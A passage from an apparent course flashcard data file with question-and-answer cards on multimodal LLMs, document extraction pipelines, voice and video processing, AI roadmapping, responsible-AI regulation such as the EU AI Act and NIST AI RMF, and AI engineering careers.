    { "front": "What does KEDA scale on for an asynchronous batch-processing pipeline on Azure?", "back": "KEDA scales workers on real signals such as queue depth — workers spin up as the queue grows — which fits the async/batch pattern, whereas HTTP concurrency is the scaling signal for synchronous chat." }
  ],
  "m8l1": [
    { "front": "In a Vision Transformer (ViT), what is a 'patch' and why does it matter?", "back": "A patch is a fixed-size square of the image (e.g. 16×16 pixels) that gets flattened and projected into an embedding vector — the visual analogue of a text token. It matters because once an image is a sequence of patch tokens, the same transformer self-attention machinery handles it just like text." },
    { "front": "What are the three architectural components that let a multimodal LLM process an image?", "back": "A vision encoder (ViT-style) turns the image into patch-embedding vectors, a projection layer maps those vectors into the same embedding space the language model uses for text, and the language model then attends over a single mixed sequence of text and projected image tokens." },
    { "front": "When should you reach for traditional OCR / Document Intelligence instead of a vision LLM to read a document?", "back": "Use OCR/Document Intelligence for high-volume, known, structured formats: it's cheap (~$0.001–0.01/page), fast, deterministic, and returns bounding-box coordinates for highlighting and audit. Reserve the vision LLM for messy, low-volume, or reasoning-heavy cases." },
    { "front": "Why does sending a higher-resolution image to a multimodal LLM cost more, and what is the tradeoff?", "back": "More resolution means more patches, and each patch becomes tokens the model must process. More patches give more detail but cost more tokens and latency; downscaling too far makes small text illegible, so there's a per-task sweet spot." },
    { "front": "What is the standard antidote to a vision LLM hallucinating a field (like an invoice total) that isn't on the page?", "back": "Instruct the model to return null when a field isn't present and never guess, then cross-validate the numbers (e.g. do line items sum to the subtotal?) and verify low-confidence extractions against OCR." }
  ],
  "m8l2": [
    { "front": "What is the 'modality matrix' and how does it help you scope a multimodal use case?", "back": "It's a grid of input modalities × output modalities (text, image, audio, video as input, output, or both). Identifying which cell your use case needs — e.g. image→text, audio→audio — decides the model and pipeline you build." },
    { "front": "Why is the recommended pattern to convert exotic modalities like audio or video into text as early as possible?", "back": "Once the content is text, you can reuse everything you already have for LLMs — your normal business logic, RAG, evals, and structured-output handling — instead of building new machinery per modality." },
    { "front": "When should you use a STT→LLM→TTS pipeline versus a native speech-to-speech model?", "back": "Use the pipeline when you need a transcript and control — it's flexible (swap any stage) and debuggable. Use native speech-to-speech when conversational latency and naturalness are the product, since it collapses the three stages and preserves tone, emotion, and interruptions." },
    { "front": "Why are voice agents fundamentally a latency problem, and name two techniques to address it.", "back": "Humans notice a conversational gap above ~300–500ms, and STT + LLM time-to-first-token + TTS adds up fast. Techniques: stream every stage (transcribe/generate/synthesize on partial input), use endpointing, handle barge-in, use a fast model, or go native speech-to-speech." },
    { "front": "How do you process video cost-effectively instead of feeding raw frames to a model?", "back": "Decompose it: sample keyframes (on scene changes or every N seconds) and treat them as images, transcribe the audio track with STT, then fuse the frames plus the timestamped transcript so the LLM reasons over what was shown and said. The key tradeoff is sampling rate." },
    { "front": "What governance obligations does generating media (images, audio, video) add that understanding tasks don't?", "back": "Provenance (was this AI-made?), C2PA content credentials / watermarking, rights and likeness consent (don't clone a voice or face without permission), brand safety, and deepfake risk — generated output needs review and provenance, not blind publication." }
  ],
  "m8l3": [
    { "front": "Why send a document page as an image to a vision LLM instead of extracting its text with a library like PyPDF?", "back": "PDF text extraction loses critical information: table structure, spatial relationships, headers/footers, checkboxes, logos, and stamps. The LLM seeing the actual page image captures all of this, at the cost of being more expensive per document." },
    { "front": "Describe the production hybrid document-processing pipeline that combines Document Intelligence and a vision LLM.", "back": "Classify the document type, route known formats to Azure Document Intelligence (fast, cheap, prebuilt models) and unknown/complex ones to a vision LLM, validate by cross-checking values, and send low-confidence results to a human-in-the-loop exception queue whose corrections feed back into the system." },
    { "front": "When extracting invoice data, what cross-validation checks catch extraction errors?", "back": "Check that the line items sum to the subtotal, and that subtotal + tax + shipping equals the stated total. A mismatch (beyond a small rounding tolerance) flags the extraction as lower confidence and routes it for review." },
    { "front": "Why is field-level accuracy preferred over a single aggregate accuracy number for document extraction?", "back": "Aggregate accuracy hides per-field weakness — you might be 99% on vendor name but only 80% on line items, and line items are what matter. Measuring per field is also what lets you set a trustworthy auto-process vs human-review confidence threshold." },
    { "front": "Why must you define a match type (exact, normalized, fuzzy) per field when scoring extraction accuracy?", "back": "Different fields need different comparison rules: exact match for IDs and amounts, normalized match for dates and currency (is \"$1,234.00\" == \"1234\"?), and fuzzy match for free text. Without per-field match types the accuracy number is meaningless." },
    { "front": "At scale, roughly how does the cost of Azure Document Intelligence compare to a vision LLM, and when is each justified?", "back": "Document Intelligence runs about $1.50/1000 pages versus $15–50/1000 pages for an LLM — roughly 10–30× cheaper. Use Document Intelligence for high-volume structured formats; reserve the costlier LLM for low-volume, diverse, or reasoning-heavy documents." }
  ],
  "m9l1": [
    { "front": "What are the three horizons of an AI roadmap, and what kind of work does each contain?", "back": "Horizon 1 (0-3 mo): deploy off-the-shelf tools for quick wins. Horizon 2 (3-12 mo): build custom RAG/automation on your data for competitive advantage. Horizon 3 (12+ mo): transformative autonomous agents and AI-native products." },
    { "front": "Why structure an AI roadmap as three horizons rather than one top-down prioritized backlog?", "back": "The horizons form a dependency chain, not just time buckets: H1 buys capability and trust and surfaces data problems cheaply, H2 builds the moat on that foundation, and H3 transforms once data/evals/trust are proven. The roadmap sequences risk, not just dates." },
    { "front": "What is the #1 roadmap failure mode, and what is the antidote?", "back": "The moonshot-first trap: betting the program on a Horizon-3 autonomous agent before H1 has built data, evals, or trust. The antidote is to stage the horizons and earn the moonshot." },
    { "front": "Give a RICE-style scoring formula for ranking AI projects and explain what 'confidence' captures.", "back": "priority ≈ (reach × impact × confidence) / effort. Confidence explicitly discounts AI-specific unknowns: do we have the data, can we measure quality, and does the use case tolerate non-determinism? A dazzling project with low confidence ranks below a modest shippable one." },
    { "front": "What four feasibility gates should an AI project pass before entering the roadmap?", "back": "Data gate (accessible, clean, governed, fresh data), measurability gate (can you define and measure 'correct'?), tolerance gate (does it tolerate non-determinism and error?), and risk gate (match autonomy to reversibility × blast-radius)." },
    { "front": "Why fund shared platform investments rather than treating each AI project as standalone?", "back": "Shared platform (eval harness, observability/cost tracking, governed RAG layer, model-abstraction layer, reusable guardrails) makes every future project cheaper. The first project pays to build it; the rest inherit it, turning AI from one-offs into an organizational capability that gets faster over time." },
    { "front": "Does building enterprise AI require PhD researchers?", "back": "No. The most impactful enterprise AI work is integration and application engineering, not research. A minimum viable team is an AI/ML engineer, a full-stack developer, a domain expert, and a product owner." }
  ],
  "m9l2": [
    { "front": "Why should responsible AI be treated as an engineering concern, not just a legal one?", "back": "The risks it manages (hallucination, inherited bias, data leakage/injection, unaccountable decisions) are the same ones you engineer against all course. The engineering you already know — evals, guardrails, monitoring, access control, PII handling — IS most of the implementation, and it should be a design constraint from day one like security." },
    { "front": "What are the four risk tiers of the EU AI Act and the obligation level of each?", "back": "Unacceptable risk → prohibited (social scoring, manipulation, certain biometrics). High risk → heavy obligations (hiring, credit, medical, etc.: risk management, logging, human oversight, conformity assessment). Limited risk → transparency (disclose AI, label synthetic media). Minimal risk → no special obligations (most internal tooling)." },
    { "front": "Why must companies outside the EU still care about the EU AI Act?", "back": "It is extraterritorial like GDPR: it applies if your system is used in the EU regardless of where you are based. Its risk-tiered structure is also becoming the shared global mental model that other regimes copy." },
    { "front": "What are the four functions of the NIST AI Risk Management Framework?", "back": "Govern (policies, roles, accountability — wraps the others), Map (context and risk, including risk tier), Measure (evals, bias/fairness testing, red-teaming), and Manage (guardrails, oversight, monitoring, incident response). It is a continuous loop, not a one-time audit." },
    { "front": "Copyright in AI breaks into which three separate questions, and which is primarily your exposure?", "back": "(1) Training data — mostly the model provider's exposure, becomes yours if you fine-tune on data you lack rights to. (2) Your inputs — don't paste confidential/copyrighted material without rights. (3) Outputs — you usually own them, but purely AI-generated work may not be copyrightable and code can carry license contamination." },
    { "front": "How do you assess fairness for a consequential AI decision, and why can't you satisfy every fairness metric?", "back": "Apply the eval discipline sliced by protected group: break eval results down across protected attributes and look for outcome gaps (disparate impact). The common fairness metrics are mathematically incompatible, so fairness is a deliberate, documented choice, not a checkbox." },
    { "front": "Under GDPR-style rules, what must you provide for automated decisions with legal or significant effect, and how does this shape architecture?", "back": "People get the right to human review and a meaningful explanation. This is why you keep facts in an editable RAG layer (to honor deletion) rather than baked into weights, and why you surface faithful feature attributions (SHAP) over plausible-sounding LLM narration, with a human in the loop." },
    { "front": "What does it mean to make responsible AI 'a pipeline, not a memo'?", "back": "Wire governance into the shipping pipeline: classify risk at intake with a use-case record, maintain an AI registry, gate releases on bias/red-team evals in CI, log inputs/outputs/decisions for accountability, scale human oversight to risk, and plan incident response and a kill switch in advance." }
  ],
  "m9l3": [
    { "front": "What three underlying forces let you reason about AI's future instead of just predicting it?", "back": "Scaling and capability (capability tracks compute/data/parameters, with abilities emerging at thresholds), economics (cost per unit of capability falls ~10x/year), and diffusion and trust (org trust, regulation, and change management gate adoption). Read each trend as a consequence of these forces." },
    { "front": "What is the practical consequence of cost per unit of AI capability falling roughly 10x per year?", "back": "Today's premium feature becomes next year's cheap commodity. It is why on-device models, many-call agents, and multimodal-by-default all become viable — so you should plan for it rather than be surprised by it." },
    { "front": "Why are agentic AI systems moving from demos to production now?", "back": "Falling cost makes the many-call agent loop affordable, and tooling for guardrails, evaluation, and orchestration has matured enough to run agents safely. The bottleneck shifts from 'can it?' to 'can we trust and afford it?'" },
    { "front": "When betting under deep uncertainty, what should you bet on versus stay loosely coupled to?", "back": "Bet on what compounds and survives — proprietary data and systems to use it, evaluation/quality infrastructure, and domain/workflow expertise (these gain value as models commoditize). Stay loosely coupled to specific models, providers, and frameworks via an abstraction layer, and prefer reversible, cheap-to-change bets." },
    { "front": "Why does adopting a model-abstraction layer help you win regardless of how the market shifts?", "back": "It makes 'the best model changed again' a config edit rather than a rewrite, so falling prices and rising capability accrue to you automatically and you stay positioned whether your preferred provider wins or loses." },
    { "front": "What is the real constraint on AI landing in an organization — capability or adoption?", "back": "Adoption, not capability. Capability existing isn't capability adopted; org trust, regulation, and change management gate how fast it lands, which is why org-wide AI literacy is a key investment." }
  ],
  "m9l4": [
    { "front": "What three skill areas make an AI engineer rare and valuable, and which is the durable advantage?", "back": "Production software engineering (deployment, testing, monitoring), AI/ML understanding (models, embeddings, fine-tuning), and domain knowledge of the business problem. The durable, scarce skill is integration and judgment — knowing which technique fits, grounding against hallucination, and shipping safely — not memorizing any one API." },
    { "front": "What are the four layers of the AI engineering credibility stack, from foundation up?", "back": "Layer 1: Proof of Work (real systems in production — the foundation). Layer 2: Public Artifacts (case studies, posts, OSS, talks that verify Layer 1). Layer 3: Community Presence (engaging, sharing, network effects). Layer 4: Thought Leadership (original frameworks and evidence-backed contrarian takes)." },
    { "front": "What is described as the single highest-leverage career move for an AI engineer, and what must those artifacts include?", "back": "Publishing 3-5 case studies of real production AI work (not tutorials or toy projects). Each should cover the business problem, the architecture and why, the hard parts that didn't work, quantified results, and lessons learned." },
    { "front": "In a case study, why is the 'What Didn't Work' section where credibility lives?", "back": "Anyone can describe the happy path. Showing what you tried and abandoned, the unexpected challenges, and the fixes demonstrates genuine production experience and honest engineering judgment that toy projects can't fake." },
    { "front": "What are the common patterns of resistance to publishing work, and the one practical antidote?", "back": "Perfectionism ('not polished enough'), impostor syndrome ('who am I to write this?'), and fear of judgment ('what if someone finds a flaw?'). The antidote: start small — post a single insight, mistake, or decision from your work week. Consistency beats intensity, and published-and-imperfect beats unpublished-and-perfect." }
  ],
};
